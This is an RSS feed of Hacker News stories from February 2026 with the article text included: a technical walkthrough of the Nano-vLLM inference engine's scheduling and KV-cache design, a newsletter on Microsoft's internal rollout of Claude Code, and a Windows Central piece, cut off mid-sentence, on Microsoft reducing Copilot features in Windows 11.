<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Mon, 02 Feb 2026 16:30:04 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[Nano-vLLM: How a vLLM-style inference engine works (107 pts)]]></title>
            <link>https://neutree.ai/blog/nano-vllm-part-1</link>
            <guid>46855447</guid>
            <pubDate>Mon, 02 Feb 2026 12:52:35 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://neutree.ai/blog/nano-vllm-part-1">https://neutree.ai/blog/nano-vllm-part-1</a>, See on <a href="https://news.ycombinator.com/item?id=46855447">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-astro-cid-7jjqptxk=""> <h2 id="architecture-scheduling-and-the-path-from-prompt-to-token">Architecture, Scheduling, and the Path from Prompt to Token</h2>
<p>When deploying large language models in production, the inference engine becomes a critical piece of infrastructure. Every LLM API you use — OpenAI, Claude, DeepSeek — is sitting on top of an inference engine like this. While most developers interact with LLMs through high-level APIs, understanding what happens beneath the surface—how prompts are processed, how requests are batched, and how GPU resources are managed—can significantly impact system design decisions.</p>
<p>This two-part series explores these internals through <a href="https://github.com/GeeeekExplorer/nano-vllm">Nano-vLLM</a>, a minimal (~1,200 lines of Python) yet production-grade implementation that distills the core ideas behind <a href="https://github.com/vllm-project/vllm">vLLM</a>, one of the most widely adopted open-source inference engines.</p>
<p>Nano-vLLM was created by a contributor to DeepSeek, whose name appears on the technical reports of models like DeepSeek-V3 and R1. Despite its minimal codebase, it implements the essential features that make vLLM production-ready: prefix caching, tensor parallelism, CUDA graph compilation, and torch compilation optimizations. Benchmarks show it achieving throughput comparable to—or even slightly exceeding—the full vLLM implementation. This makes it an ideal lens for understanding inference engine design without getting lost in the complexity of supporting dozens of model architectures and hardware backends.</p>
<p>In Part 1, we focus on the engineering architecture: how the system is organized, how requests flow through the pipeline, and how scheduling decisions are made. We will treat the actual model computation as a black box for now—Part 2 will open that box to explore attention mechanisms, KV cache internals, and tensor parallelism at the computation level.</p>
<h2 id="the-main-flow-from-prompt-to-output">The Main Flow: From Prompt to Output</h2>
<p>The entry point to Nano-vLLM is straightforward: an <code>LLM</code> class with a <code>generate</code> method. You pass in an array of prompts and sampling parameters, and get back the generated text. But behind this simple interface lies a carefully designed pipeline that transforms text into tokens, schedules computation efficiently, and manages GPU resources.</p>
<p><img src="https://neutree.ai/images/blog/nano-vllm-01-01.png" alt="01"></p>
<h3 id="from-prompts-to-sequences">From Prompts to Sequences</h3>
<p>When <code>generate</code> is called, each prompt string goes through a tokenizer—a model-specific component that splits natural language into tokens, the fundamental units that LLMs process. Different model families (Qwen, LLaMA, DeepSeek) use different tokenizers, which is why a prompt of the same length may produce different token counts across models. The tokenizer converts each prompt into a <strong>sequence</strong>: an internal data structure representing a variable-length array of token IDs. This sequence becomes the core unit of work flowing through the rest of the system.</p>
<h3 id="the-producer-consumer-pattern">The Producer-Consumer Pattern</h3>
<p>Here’s where the architecture gets interesting. Rather than processing each sequence immediately, the system adopts a producer-consumer pattern with the Scheduler at its center. The <code>add_request</code> method acts as the producer: it converts prompts to sequences and places them into the Scheduler’s queue. Meanwhile, a separate <strong>step loop</strong> acts as the consumer, pulling batches of sequences from the Scheduler for processing. This decoupling is key—it allows the system to accumulate multiple sequences and process them together, which is where the performance gains come from.</p>
<h3 id="batching-and-the-throughput-latency-trade-off">Batching and the Throughput-Latency Trade-off</h3>
<p>Why does batching matter? GPU computation has significant fixed overhead—initializing CUDA kernels, transferring data between CPU and GPU memory, and synchronizing results. If you process one sequence at a time, you pay this overhead for every single request. By batching multiple sequences together, you amortize this overhead across many requests, dramatically improving overall throughput.</p>
<p>However, batching comes with a trade-off. When three prompts are batched together, each must wait for the others to complete before any results are returned. The total time for the batch is determined by the slowest sequence. This means: larger batches yield higher throughput but potentially higher latency for individual requests; smaller batches yield lower latency but reduced throughput. This is a fundamental tension in inference engine design, and the batch size parameters you configure directly control this trade-off.</p>
<h3 id="prefill-vs-decode-two-phases-of-generation">Prefill vs. Decode: Two Phases of Generation</h3>
<p>Before diving into the Scheduler, we need to understand a crucial distinction. LLM inference happens in two phases:</p>
<ul>
<li><strong>Prefill</strong>: Processing the input prompt. All input tokens are processed together to build up the model’s internal state. During this phase, the user sees nothing.</li>
<li><strong>Decode</strong>: Generating output tokens. The model produces one token at a time, each depending on all previous tokens. This is when you see text streaming out.</li>
</ul>
<p>For a single sequence, there is exactly one prefill phase followed by many decode steps. The Scheduler needs to distinguish between these phases because they have very different computational characteristics—prefill processes many tokens at once, while decode processes just one token per step.</p>
<h2 id="inside-the-scheduler">Inside the Scheduler</h2>
<p>The Scheduler is responsible for deciding which sequences to process and in what order. It maintains two queues:</p>
<p><img src="https://neutree.ai/images/blog/nano-vllm-01-02.png" alt="02"></p>
<h3 id="waiting-and-running-queues">Waiting and Running Queues</h3>
<ul>
<li><strong>Waiting Queue</strong>: Sequences that have been submitted but not yet started. New sequences from <code>add_request</code> always enter here first.</li>
<li><strong>Running Queue</strong>: Sequences that are actively being processed—either in prefill or decode phase.</li>
</ul>
<p>When a sequence enters the Waiting queue, the Scheduler checks with another component called the Block Manager to allocate resources for it. Once allocated, the sequence moves to the Running queue. The Scheduler then selects sequences from the Running queue for the next computation step, grouping them into a batch along with an action indicator (prefill or decode).</p>
<h3 id="handling-resource-exhaustion">Handling Resource Exhaustion</h3>
<p>What happens when GPU memory fills up? The KV cache (which stores intermediate computation results) has limited capacity. If a sequence in the Running queue cannot continue because there’s no room to store its next token’s cache, the Scheduler <strong>preempts</strong> it—moving it back to the front of the Waiting queue. This ensures the sequence will resume as soon as resources free up, while allowing other sequences to make progress.</p>
<p>When a sequence completes (reaches an end-of-sequence token or maximum length), the Scheduler removes it from the Running queue and deallocates its resources, freeing space for waiting sequences.</p>
<h2 id="the-block-manager-kv-cache-control-plane">The Block Manager: KV Cache Control Plane</h2>
<p>The Block Manager is where vLLM’s memory management innovation lives. To understand it, we first need to introduce a new resource unit: the <strong>block</strong>.</p>
<p><img src="https://neutree.ai/images/blog/nano-vllm-01-03.png" alt="03"></p>
<h3 id="from-sequences-to-blocks">From Sequences to Blocks</h3>
<p>A sequence is a variable-length array of tokens—it can be 10 tokens or 10,000. But variable-length allocations are inefficient for GPU memory management. The Block Manager solves this by dividing sequences into fixed-size <strong>blocks</strong> (default: 256 tokens each).</p>
<p>A 700-token sequence would occupy three blocks: two full blocks (256 tokens each) and one partial block (188 tokens, with 68 slots unused). Importantly, tokens from different sequences never share a block—but a long sequence will span multiple blocks.</p>
<h3 id="prefix-caching-via-hashing">Prefix Caching via Hashing</h3>
<p>Here’s where it gets clever. Each block’s content is hashed, and the Block Manager maintains a hash-to-block-id mapping. When a new sequence arrives, the system computes hashes for its blocks and checks if any already exist in the cache.</p>
<p>If a block with the same hash exists, the system reuses it by incrementing a reference count—no redundant computation or storage needed. This is particularly powerful for scenarios where many requests share common prefixes (like system prompts in chat applications). The prefix only needs to be computed once; subsequent requests can reuse the cached results.</p>
<h3 id="control-plane-vs-data-plane">Control Plane vs. Data Plane</h3>
<p>A subtle but important point: the Block Manager lives in CPU memory and only tracks <em>metadata</em>—which blocks are allocated, their reference counts, and hash mappings. The actual KV cache data lives on the GPU. The Block Manager is the <strong>control plane</strong>; the GPU memory is the <strong>data plane</strong>. This separation allows fast allocation decisions without touching GPU memory until actual computation happens.</p>
<p>When blocks are deallocated, the Block Manager marks them as free immediately, but the GPU memory isn’t zeroed—it’s simply overwritten when the block is reused. This avoids unnecessary memory operations.</p>
<h2 id="the-model-runner-execution-and-parallelism">The Model Runner: Execution and Parallelism</h2>
<p>The Model Runner is responsible for actually executing the model on GPU(s). When the step loop retrieves a batch of sequences from the Scheduler, it passes them to the Model Runner along with the action (prefill or decode).</p>
<p><img src="https://neutree.ai/images/blog/nano-vllm-01-04.png" alt="04"></p>
<h3 id="tensor-parallel-communication">Tensor Parallel Communication</h3>
<p>When a model is too large for a single GPU, Nano-vLLM supports <strong>tensor parallelism</strong> (TP)—splitting the model across multiple GPUs. With TP=8, for example, eight GPUs work together to run a single model.</p>
<p><img src="https://neutree.ai/images/blog/nano-vllm-01-05.png" alt="05"></p>
<p>The communication architecture uses a leader-worker pattern:</p>
<ul>
<li><strong>Rank 0 (Leader)</strong>: Receives commands from the step loop, executes its portion, and coordinates with workers.</li>
<li><strong>Ranks 1 to N-1 (Workers)</strong>: Continuously poll a shared memory buffer for commands from the leader.</li>
</ul>
<p>When the leader receives a <code>run</code> command, it writes the method name and arguments to shared memory. Workers detect this, read the parameters, and execute the same operation on their respective GPUs. Each worker knows its rank, so it can compute its designated portion of the work. This shared-memory approach is efficient for single-machine multi-GPU setups, avoiding network overhead.</p>
<h3 id="preparing-for-computation">Preparing for Computation</h3>
<p>Before invoking the model, the Model Runner prepares the input based on the action:</p>
<ul>
<li><strong>Prepare Prefill</strong>: Batches multiple sequences with variable lengths, computing cumulative sequence lengths for efficient attention computation.</li>
<li><strong>Prepare Decode</strong>: Batches single tokens (one per sequence) with their positions and slot mappings for KV cache access.</li>
</ul>
<p>This preparation also involves converting CPU-side token data into GPU tensors—the point where data crosses from CPU memory to GPU memory.</p>
<h3 id="cuda-graphs-reducing-kernel-launch-overhead">CUDA Graphs: Reducing Kernel Launch Overhead</h3>
<p>For decode steps (which process just one token per sequence), kernel launch overhead can become significant relative to actual computation. CUDA Graphs address this by recording a sequence of GPU operations once, then replaying them with different inputs. Nano-vLLM pre-captures CUDA graphs for common batch sizes (1, 2, 4, 8, 16, up to 512), allowing decode steps to execute with minimal launch overhead.</p>
<h3 id="sampling-from-logits-to-tokens">Sampling: From Logits to Tokens</h3>
<p>The model doesn’t output a single token—it outputs <strong>logits</strong>, a probability distribution over the entire vocabulary. The final step is <strong>sampling</strong>: selecting one token from this distribution.</p>
<p><img src="https://neutree.ai/images/blog/nano-vllm-01-06.png" alt="06"></p>
<p>The <code>temperature</code> parameter controls this selection. Mathematically, it adjusts the shape of the probability distribution:</p>
<ul>
<li><strong>Low temperature</strong> (approaching 0): The distribution becomes sharply peaked. The highest-probability token is almost always selected, making outputs more deterministic and focused.</li>
<li><strong>High temperature</strong>: The distribution flattens. Lower-probability tokens have a better chance of being selected, making outputs more diverse and creative.</li>
</ul>
<p>This is where the “randomness” in LLM outputs comes from—and why the same prompt can produce different responses. The sampling step selects from a valid range of candidates, introducing controlled variability.</p>
<h2 id="whats-next">What’s Next</h2>
<p>In Part 2, we’ll open the black box of model. We’ll explore:</p>
<ul>
<li>How the model transforms tokens into hidden states and back</li>
<li>The attention mechanism and why multi-head attention matters</li>
<li>How KV cache is physically laid out on GPU memory</li>
<li>Dense vs. MoE (Mixture of Experts) architectures</li>
<li>How tensor parallelism works at the computation level</li>
</ul>
<p>Understanding these internals will complete the picture—from prompt string to generated text, with nothing left hidden.</p> </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Claude Code is suddenly everywhere inside Microsoft (151 pts)]]></title>
            <link>https://www.theverge.com/tech/865689/microsoft-claude-code-anthropic-partnership-notepad</link>
            <guid>46854999</guid>
            <pubDate>Mon, 02 Feb 2026 11:58:58 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.theverge.com/tech/865689/microsoft-claude-code-anthropic-partnership-notepad">https://www.theverge.com/tech/865689/microsoft-claude-code-anthropic-partnership-notepad</a>, See on <a href="https://news.ycombinator.com/item?id=46854999">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="zephr-anchor"><p>Developers have been comparing the strengths and weaknesses of Anthropic’s Claude Code, Anysphere’s Cursor, and Microsoft’s GitHub Copilot for months now, looking for a winner. While no individual AI coding tool manages to be the best at every task that software developers do each day, Claude Code is increasingly coming out on top for its ease of use, both for developers and nontechnical users.</p><p>It seems like Microsoft agrees, as sources tell me the company is now encouraging thousands of its employees from some of its most prolific teams to pick up Claude Code and get coding, even if they’re not developers.</p><p>Microsoft first started adopting Anthropic’s Claude Sonnet 4 model inside its developer division in June last year, before <a href="https://www.theverge.com/report/778641/microsoft-visual-studio-code-anthropic-claude-4">favoring it for paid users</a> of GitHub Copilot several months later. Now, Microsoft is going a step beyond using Anthropic’s AI models and widely adopting Claude Code across its biggest engineering teams.</p><p>Microsoft’s CoreAI team, the new AI engineering group led by former Meta engineering chief Jay Parikh, has been testing Claude Code in recent months, and last week Microsoft’s Experiences + Devices division were being asked to install Claude Code. This division is responsible for Windows, Microsoft 365, Outlook, Microsoft Teams, Bing, Edge, Surface, and more.</p><p>Even employees without any coding experience are being encouraged to experiment with Claude Code, to allow designers and project managers to prototype ideas. Microsoft has also approved the use of Claude Code across all of its code and repositories for its Business and Industry Copilot teams.</p><p>Software engineers at Microsoft are now expected to use both Claude Code and GitHub Copilot and give feedback comparing the two, I’m told. Microsoft sells GitHub Copilot as its AI coding tool of choice to its customers, but if these broad internal pilot programs are successful, then it’s possible the company could even eventually sell Claude Code directly to its cloud customers.</p><p>Microsoft is now one of Anthropic’s top customers, according to a recent report from <a href="https://www.theinformation.com/articles/microsofts-spending-anthropic-ai-pace-hit-500-million"><em>The Information</em></a>. The software maker is also counting selling Anthropic AI models toward Azure sales quotas, which is unusual given Microsoft typically only offers its salespeople incentives for homegrown products or models from OpenAI.</p><p>Microsoft’s decision to adopt Claude Code more broadly among its engineering teams certainly looks like a vote of confidence in Anthropic’s AI tools over its own, especially as it’s encouraging nontechnical employees to try out coding. But the reality is that Microsoft’s developers are likely to use a mix of AI tools, and adopting Claude Code is another part of that tool set.</p><p>“Companies regularly test and trial competing products to gain a better understanding of the market landscape,” says Frank Shaw, Microsoft’s communications chief, in a statement to <em>Notepad</em>. “OpenAI continues to be our primary partner and model provider on frontier models, and we remain committed to our long-term partnership.”</p><p>While Microsoft remains committed to OpenAI, it is increasingly working with Anthropic to bring its models and tools to Microsoft’s own teams and the software it sells to customers. Microsoft and Anthropic <a href="https://www.theverge.com/news/822988/microsoft-anthropic-partnership-claude-models-azure-investment-nvidia">signed a deal</a> in November that allows Microsoft Foundry customers to get access to Claude Sonnet 4.5, Claude Opus 4.1, and Claude Haiku 4.5. The deal also involves Anthropic committing to purchasing $30 billion of Azure compute capacity.</p><p>Microsoft has also started favoring Anthropic’s Claude models <a href="https://www.theverge.com/news/784392/microsoft-365-copilot-anthropic-ai-models-feature">inside Microsoft 365 apps and Copilot</a> recently, using them in <a href="https://www.theverge.com/news/787076/microsoft-office-agent-mode-office-agent-anthropic-models">specific apps</a> or features where Anthropic’s models have proved more capable than OpenAI’s counterparts.</p><p>The big question here is, what does the increased use of Claude Code at Microsoft mean for its more than 100,000 code repositories? Microsoft told me last year that <a href="https://www.theverge.com/tech/831379/microsoft-developer-ai-usage-stats-notepad">91 percent of its engineering teams use GitHub Copilot</a> and a variety of teams have been using the AI tool to speed up mundane tasks. Microsoft’s use of AI tools has been largely restricted to software engineers, but with Claude Code and <a href="https://www.theverge.com/ai-artificial-intelligence/860730/anthropic-cowork-feature-ai-agents-claude-code">Claude Cowork</a>, Anthropic is increasingly focused on making coding and non-coding tasks more approachable, thanks to AI agent capabilities.</p><p>Microsoft is embracing the ease of use of Claude Code to allow more nontechnical employees to commit code using AI, and this broad pilot will certainly highlight the challenges and benefits of that shift. It also puts further pressure on junior developer roles, with fears in the industry that these roles are increasingly disappearing because of AI. Microsoft just took another big step toward a future where more autonomous AI agents are creating code, further wrestling control from its software engineers.</p><div><p id="its-xbox-time"><h2><strong>It’s Xbox time</strong></h2></p></div><p>Microsoft is getting ready to show off two of its biggest Xbox games this year, <em>Forza Horizon 6</em> and <em>Fable</em>, later today as part of its <a href="https://www.theverge.com/news/858471/xbox-developer-direct-forza-horizon-6-fable-beast-of-reincarnation-stream">Xbox Developer Direct stream</a>. There will also be a first in-depth look at <em>Beast of Reincarnation </em>and at least one other game shown, I’m hearing. Double Fine is ready to <a href="https://www.doublefine.com/dftv/kiln">show off <em>Kiln</em></a>, a multiplayer, team-based brawler. I understand Double Fine has been holding playtests recently, where you play as a spirit that can inhabit pottery and carry water to douse an opponent’s kiln and put out a fire.</p><p>I wouldn’t be surprised to see <em>Kiln </em>appear as an early preview in the coming months, followed by <em>Forza Horizon 6</em> in May and then <em>Halo: Campaign Evolved. </em>I keep hearing that both <em>Fable </em>and <em>Gears of War: E-Day </em>are currently targeting a release in the second half of this year. Microsoft is keen to release new <em>Forza</em>, <em>Gears</em>, <em>Halo</em>, and <em>Fable </em>games in 2026 to mark 25 years of Xbox.</p><div><p id="the-pad"><h2>The pad</h2></p></div><div><ul><li><span><strong>Microsoft’s first Windows 11 update of 2026 stopped some computers from shutting down. </strong>It’s only January and Microsoft has had to rush out an emergency out-of-band fix that stopped some Windows 11 PCs from shutting down. <a href="https://www.theverge.com/news/864032/microsofts-out-of-band-windows-11-update-bug">The issues</a> were limited to machines running Enterprise and IoT editions of Windows 11 version 23H2, but it’s yet another buggy update for Windows, which is becoming increasingly common.</span></li><li><span><strong>Microsoft’s free Xbox Cloud Gaming is coming soon with ads. </strong>Microsoft is getting closer to launching its free streaming option for Xbox Cloud Gaming. The ad-supported feature <a href="https://www.theverge.com/news/864261/xbox-cloud-gaming-free-ads-testing">has started appearing</a> inside the Xbox app for PC, indicating “1 hour of ad-supported playtime per session.” I’m expecting to see this rollout with preroll ads in the coming weeks, but there could be limits of up to five hours free per month.</span></li><li><span><strong>Microsoft wants to build 15 data centers in Mount Pleasant, Wisconsin. </strong>The empty land formerly owned by Foxconn is about to be transformed <a href="https://www.theverge.com/news/865387/microsoft-wants-to-build-15-data-centers-in-mount-pleasant-wisconsin">into Microsoft data centers</a>. Leaders of the local village in Mount Pleasant, Wisconsin, approved plans for the data centers earlier this week, and final approval could come next week. Foxconn’s failed Wisconsin project had promised 13,000 jobs, but now the land will be filled with a 1.2-million-square-foot data center project that will hold hundreds of thousands of Nvidia’s AI GPUs.</span></li><li><span><strong>The Xbox app is now available for all Arm-based Windows 11 PCs. </strong>After a rocky start to gaming on Windows on Arm, Microsoft has <a href="https://www.theverge.com/games/864924/the-xbox-app-is-now-ready-for-gaming-on-all-arm-based-windows-11-pcs">updated its Xbox app</a> this week so it’s fully compatible with all Qualcomm-powered devices. More than 85 percent of the Xbox Game Pass catalog is also now compatible with Arm-based devices, but the majority of games will still need to be emulated using Microsoft’s Prism technology.</span></li><li><span><strong>Microsoft Paint now has an AI-powered coloring book. </strong>Microsoft is adding more AI features to its Paint app this week. Windows testers can now try out a <a href="https://blogs.windows.com/windows-insider/2026/01/21/notepad-and-paint-updates-begin-rolling-out-to-windows-insiders/">coloring book feature</a> that lets you create coloring book pages from a text prompt. It’s available inside the Copilot button in Paint, and you have to have a Copilot Plus PC to be able to use it. Notepad (the app!) is also getting expanded Markdown syntax features and a new welcome experience to highlight features. I never thought I’d see the day that Notepad, a lightweight app, would need a welcome screen because of all the features Microsoft has packed in.</span></li><li><span><strong>GitHub has a new Copilot SDK.</strong> Microsoft is announcing a technical preview of its <a href="https://github.blog/news-insights/company-news/build-an-agent-into-any-app-with-the-github-copilot-sdk/">GitHub Copilot SDK</a> today, which brings the power of the GitHub Copilot CLI to any app. It essentially allows developers to bring GitHub Copilot capabilities as a programmable SDK for Python, TypeScript, Go, and .NET. Microsoft teams have already used this to build custom GUIs for agents, summarizing tools, YouTube chapter generators, and more.</span></li><li><span><strong>Satya Nadella and former British Prime Minister Rishi Sunak chat AI. </strong>Former UK leader <strong>Rishi Sunak</strong> took on a senior adviser role at Microsoft and Anthropic last year, and he’s now appeared alongside Microsoft CEO <strong>Satya Nadella</strong> to discuss the future of AI. The roughly <a href="https://www.linkedin.com/events/7416604100856819713/">30-minute talk</a> didn’t have any surprising news, but Sunak did agree with Nvidia CEO <strong>Jensen Huang</strong> that “you may not lose your job to AI, but you may well lose your job to someone using AI.” Nadella thinks AI will make us all “managers of infinite minds,” much like how we have “information at your fingertips.”</span></li><li><span><strong>Microsoft now sponsors the Mercedes-AMG F1 team</strong>. Microsoft is switching its F1 allegiances from Alpine to Mercedes-AMG for the 2026 season. A <a href="https://www.mercedesamgf1.com/news/mercedes-amg-f1-and-microsoft-unite-to-drive-innovation-from-factory-to-circuit">new multiyear partnership</a> will see Mercedes-AMG use Microsoft technologies for race team operations and plaster the Microsoft logo in prominent positions on the 2026 Mercedes-AMG F1 car and on racing suits. There’s a big technical shake-up for the 2026 season, with all-new chassis, power units, and fuel regulations.</span></li></ul></div><p>I’m always keen to hear from readers, so please drop a comment here, or you can reach me at <a href="mailto:notepad@theverge.com">notepad@theverge.com</a> if you want to discuss anything else. If you’ve heard about any of Microsoft’s secret projects, you can reach me via email at <a href="mailto:notepad@theverge.com">notepad@theverge.com</a> or speak to me confidentially on the Signal messaging app, where <a href="https://signal.me/#eu/soK8N9/6J1KVh2/ZZblbDEGXHNH1gK0Q+RaxJQ7vUxDDTYvxX8hARqMZfjuz3Egj">I’m tomwarren.01</a>. I’m also tomwarren on Telegram, if you’d prefer to chat there.</p><p>Thanks for subscribing to <em>Notepad</em>.</p><div><p><span><strong>Follow topics and authors</strong> from this story to see more like this in your personalized homepage feed and to receive email updates.</span></p><ul><li id="follow-author-article_footer-dmcyOmF1dGhvclByb2ZpbGU6MTY0"><span aria-expanded="false" aria-haspopup="true" role="button" tabindex="0"><span><span><svg width="9" height="9" viewBox="0 0 9 9" fill="none" xmlns="http://www.w3.org/2000/svg" aria-label="Follow"><path d="M5 0H4V4H0V5H4V9H5V5H9V4H5V0Z"></path></svg></span><span>Tom Warren</span></span></span></li><li></li><li></li><li></li><li></li><li></li></ul></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Microsoft is walking back Windows 11's AI overload (148 pts)]]></title>
            <link>https://www.windowscentral.com/microsoft/windows-11/microsoft-is-reevaluating-its-ai-efforts-on-windows-11-plans-to-reduce-copilot-integrations-and-evolve-recall</link>
            <guid>46854951</guid>
            <pubDate>Mon, 02 Feb 2026 11:52:29 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.windowscentral.com/microsoft/windows-11/microsoft-is-reevaluating-its-ai-efforts-on-windows-11-plans-to-reduce-copilot-integrations-and-evolve-recall">https://www.windowscentral.com/microsoft/windows-11/microsoft-is-reevaluating-its-ai-efforts-on-windows-11-plans-to-reduce-copilot-integrations-and-evolve-recall</a>, See on <a href="https://news.ycombinator.com/item?id=46854951">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-widget-type="contentparsed" id="content">
<section>
<div>
<div>
<picture data-new-v2-image="true">
<source type="image/webp" srcset="https://cdn.mos.cms.futurecdn.net/xstyFBAMP9XTUL8qniRTN4-1920-80.jpg.webp 1920w, https://cdn.mos.cms.futurecdn.net/xstyFBAMP9XTUL8qniRTN4-1200-80.jpg.webp 1200w, https://cdn.mos.cms.futurecdn.net/xstyFBAMP9XTUL8qniRTN4-1024-80.jpg.webp 1024w, https://cdn.mos.cms.futurecdn.net/xstyFBAMP9XTUL8qniRTN4-970-80.jpg.webp 970w, https://cdn.mos.cms.futurecdn.net/xstyFBAMP9XTUL8qniRTN4-650-80.jpg.webp 650w, https://cdn.mos.cms.futurecdn.net/xstyFBAMP9XTUL8qniRTN4-480-80.jpg.webp 480w, https://cdn.mos.cms.futurecdn.net/xstyFBAMP9XTUL8qniRTN4-320-80.jpg.webp 320w" sizes="(min-width: 1000px) 600px, calc(100vw - 40px)">
<img src="https://cdn.mos.cms.futurecdn.net/xstyFBAMP9XTUL8qniRTN4.jpg" alt="Mockups with Microsoft&amp;#039;s AI agent Copilot in Windows 11 and the Windows 11 taskbar" srcset="https://cdn.mos.cms.futurecdn.net/xstyFBAMP9XTUL8qniRTN4-1920-80.jpg 1920w, https://cdn.mos.cms.futurecdn.net/xstyFBAMP9XTUL8qniRTN4-1200-80.jpg 1200w, https://cdn.mos.cms.futurecdn.net/xstyFBAMP9XTUL8qniRTN4-1024-80.jpg 1024w, https://cdn.mos.cms.futurecdn.net/xstyFBAMP9XTUL8qniRTN4-970-80.jpg 970w, https://cdn.mos.cms.futurecdn.net/xstyFBAMP9XTUL8qniRTN4-650-80.jpg 650w, https://cdn.mos.cms.futurecdn.net/xstyFBAMP9XTUL8qniRTN4-480-80.jpg 480w, https://cdn.mos.cms.futurecdn.net/xstyFBAMP9XTUL8qniRTN4-320-80.jpg 320w" sizes="(min-width: 1000px) 600px, calc(100vw - 40px)" data-new-v2-image="true" data-original-mos="https://cdn.mos.cms.futurecdn.net/xstyFBAMP9XTUL8qniRTN4.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/xstyFBAMP9XTUL8qniRTN4.jpg" data-pin-nopin="true" fetchpriority="high">
</picture>
</div>
<figcaption>
<span>(Image credit: Microsoft | Future | Edited with Gemini)</span>
</figcaption>
</div>
<div id="article-body">

<p id="cdae77b2-5818-4a73-98e7-2a1f11c9fbe9">It’s fair to say that Windows 11’s recent endeavour into <a data-analytics-id="inline-link" href="https://www.windowscentral.com/artificial-intelligence" data-auto-tag-linker="true" data-url="https://www.windowscentral.com/artificial-intelligence" data-hl-processed="none" data-mrf-recirculation="inline-link" data-before-rewrite-redirect="https://www.windowscentral.com/tag/artificial-intelligence" data-before-rewrite-localise="https://www.windowscentral.com/artificial-intelligence">AI</a> hasn’t gone down well with its most passionate users. It started in 2024 with the unveiling of Windows Recall, which was met with such backlash that <a data-analytics-id="inline-link" href="https://www.windowscentral.com/software-apps/windows-11/microsoft-postpones-windows-recall-after-major-backlash-will-launch-copilot-pcs-without-headlining-ai-feature" data-url="https://www.windowscentral.com/software-apps/windows-11/microsoft-postpones-windows-recall-after-major-backlash-will-launch-copilot-pcs-without-headlining-ai-feature" data-hl-processed="none" data-mrf-recirculation="inline-link" data-before-rewrite-localise="https://www.windowscentral.com/software-apps/windows-11/microsoft-postpones-windows-recall-after-major-backlash-will-launch-copilot-pcs-without-headlining-ai-feature">Microsoft was forced to postpone it</a> by an entire year while it addressed major security and privacy flaws.</p><p>It seems like things have been downhill since. In the last year, Microsoft has taken every opportunity to enshittify Windows 11 by <a data-analytics-id="inline-link" href="https://www.windowscentral.com/software-apps/windows-11/microsoft-integrates-notepad-with-copilot-on-windows-11" data-url="https://www.windowscentral.com/software-apps/windows-11/microsoft-integrates-notepad-with-copilot-on-windows-11" data-hl-processed="none" data-mrf-recirculation="inline-link" data-before-rewrite-localise="https://www.windowscentral.com/software-apps/windows-11/microsoft-integrates-notepad-with-copilot-on-windows-11">placing Copilot buttons wherever it can</a> across in-box apps like File Explorer and Notepad, even if the implementation is poor or unnecessary.</p><figure data-bordeaux-image-check="" id="1b5299ac-fd76-453a-b8b3-4302c09f3e45"><div><p> <picture data-new-v2-image="true">
<source type="image/webp" srcset="https://cdn.mos.cms.futurecdn.net/Yx3yFk7H6owX2aZEBQ6oCm-1200-80.jpg.webp 1200w, https://cdn.mos.cms.futurecdn.net/Yx3yFk7H6owX2aZEBQ6oCm-1024-80.jpg.webp 1024w, https://cdn.mos.cms.futurecdn.net/Yx3yFk7H6owX2aZEBQ6oCm-970-80.jpg.webp 970w, https://cdn.mos.cms.futurecdn.net/Yx3yFk7H6owX2aZEBQ6oCm-650-80.jpg.webp 650w, https://cdn.mos.cms.futurecdn.net/Yx3yFk7H6owX2aZEBQ6oCm-480-80.jpg.webp 480w, https://cdn.mos.cms.futurecdn.net/Yx3yFk7H6owX2aZEBQ6oCm-320-80.jpg.webp 320w" sizes="(min-width: 1000px) 970px, calc(100vw - 40px)">
<img src="https://cdn.mos.cms.futurecdn.net/Yx3yFk7H6owX2aZEBQ6oCm.jpg" alt="New Welcome Screen in Notepad detailing recent updates" srcset="https://cdn.mos.cms.futurecdn.net/Yx3yFk7H6owX2aZEBQ6oCm-1200-80.jpg 1200w, https://cdn.mos.cms.futurecdn.net/Yx3yFk7H6owX2aZEBQ6oCm-1024-80.jpg 1024w, https://cdn.mos.cms.futurecdn.net/Yx3yFk7H6owX2aZEBQ6oCm-970-80.jpg 970w, https://cdn.mos.cms.futurecdn.net/Yx3yFk7H6owX2aZEBQ6oCm-650-80.jpg 650w, https://cdn.mos.cms.futurecdn.net/Yx3yFk7H6owX2aZEBQ6oCm-480-80.jpg 480w, https://cdn.mos.cms.futurecdn.net/Yx3yFk7H6owX2aZEBQ6oCm-320-80.jpg 320w" sizes="(min-width: 1000px) 970px, calc(100vw - 40px)" loading="lazy" data-new-v2-image="true" data-original-mos="https://cdn.mos.cms.futurecdn.net/Yx3yFk7H6owX2aZEBQ6oCm.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/Yx3yFk7H6owX2aZEBQ6oCm.jpg">
</picture></p></div><figcaption itemprop="caption description"><span>Copilot features in Notepad? It's preposterous. </span><span itemprop="copyrightHolder">(Image credit: Windows Central)</span></figcaption></figure><p id="543e816e-cf16-47d7-9b9c-1b188ee90f29">I’m also told that Microsoft has paused work on any additional Copilot buttons for in-box apps, at least for now. While I don’t expect this pause to be permanent, it does sound like Microsoft plans to be more tactful and deliberate in where these Copilot buttons and integrations will appear going forward.</p><p>Windows Recall is another AI experience that I’m told is under review. Sources tell me that Microsoft believes that Recall, in its current implementation, has failed, though I understand the company is exploring ways to evolve the concept rather than scrap it entirely, possibly dropping the Recall name in the process, though this is unconfirmed.</p><p>Other AI initiatives, such as Semantic Search, Agentic Workspace, Windows ML, and Windows AI APIs, are continuing ahead as planned. Microsoft believes that these under-the-hood AI efforts are still important for app developers and users, positioning Windows as a viable contender amongst other OS’s that are also building AI frameworks into their 